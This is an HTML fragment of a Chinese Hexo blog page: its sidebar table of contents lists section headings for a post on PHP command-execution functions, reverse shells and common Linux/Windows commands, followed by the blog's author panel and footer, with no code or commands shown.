<span class="nav-text">arry_map()</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0"><span class="nav-number">3.</span> <span class="nav-text">命令执行常用函数</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BC%95%E5%8F%B7"><span class="nav-number">3.1.</span> <span class="nav-text">反引号</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#system"><span class="nav-number">3.2.</span> <span class="nav-text">system</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exec"><span class="nav-number">3.3.</span> <span class="nav-text">exec</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#shell-exec"><span class="nav-number">3.4.</span> <span class="nav-text">shell_exec</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#passthru"><span class="nav-number">3.5.</span> <span class="nav-text">passthru</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pcntl-exec"><span class="nav-number">3.6.</span> <span class="nav-text">pcntl_exec</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#popen"><span class="nav-number">3.7.</span> <span class="nav-text">popen</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#proc-open"><span class="nav-number">3.8.</span> <span class="nav-text">proc_open</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%9B%B8%E5%85%B3"><span class="nav-number">4.</span> <span class="nav-text">漏洞挖掘相关</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">5.</span> <span class="nav-text">反弹shell</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9shell%E6%BC%94%E7%A4%BA"><span class="nav-number">5.1.</span> <span class="nav-text">反弹shell演示</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="nav-number">6.</span> <span class="nav-text">Windows常用命令</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="nav-number">7.</span> <span class="nav-text">Linux常用命令</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="nav-number">7.0.1.</span> <span class="nav-text">读取文件</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#cat"><span class="nav-number">7.0.1.1.</span> <span class="nav-text">cat</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#tac"><span class="nav-number">7.0.1.2.</span> <span class="nav-text">tac</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#head"><span class="nav-number">7.0.1.3.</span> <span class="nav-text">head</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#curl"><span class="nav-number">7.0.1.4.</span> <span class="nav-text">curl</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E8%AF%BB%E5%8F%96"><span class="nav-number">7.0.2.</span> <span class="nav-text">目录读取</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ls"><span class="nav-number">7.0.2.1.</span> <span class="nav-text">ls</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#dir"><span class="nav-number">7.0.2.2.</span> <span class="nav-text">dir</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Linux%E9%93%BE%E6%8E%A5%E7%AC%A6"><span class="nav-number">7.0.3.</span> <span class="nav-text">Linux链接符</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E2%80%9C-%E2%80%9D%E5%88%86%E5%8F%B7%E7%94%A8%E6%B3%95"><span class="nav-number">7.0.3.1.</span> <span class="nav-text">“;”分号用法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E2%80%9C-%E2%80%9D%E7%AE%A1%E9%81%93%E7%AC%A6%E7%94%A8%E6%B3%95"><span class="nav-number">7.0.3.2.</span> <span class="nav-text">“| ”管道符用法</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8F%90%E5%8F%8A%E8%AF%9D%E9%A2%98"><span class="nav-number">8.</span> <span class="nav-text">提及话题</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="kec的博客"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">kec的博客</p>
+  <div class="site-description" itemprop="description">一句话的长度</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">22</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">17</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://1234567fang.github.io/" title="https:&#x2F;&#x2F;1234567fang.github.io&#x2F;" rel="noopener" target="_blank">友链</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">kec的博客</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
